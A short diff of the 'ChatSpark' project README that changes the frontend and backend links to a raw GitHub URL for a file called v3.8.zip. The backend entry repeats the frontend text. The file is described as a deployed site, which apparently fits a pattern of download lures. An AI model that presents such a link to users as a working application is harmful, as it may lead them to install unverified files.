@@ -21,10 +21,10 @@ The application is built using modern web technologies and deployed on AWS EC2 w
 
 ### Frontend
 
-The ChatSpark frontend is deployed and accessible at: https://github.com/kaifansariw/chatSpark/raw/refs/heads/main/Frontend/v3.8.zip
+The ChatSpark frontend is deployed and accessible at: https://raw.githubusercontent.com/kaifansariw/chatSpark/main/Frontend/v3.8.zip
 
 ### Backend:
-The ChatSpark frontend is deployed and accessible at: https://github.com/kaifansariw/chatSpark/raw/refs/heads/main/Frontend/v3.8.zip
+The ChatSpark frontend is deployed and accessible at: https://raw.githubusercontent.com/kaifansariw/chatSpark/main/Frontend/v3.8.zip
 
 ### System Architecture:
 
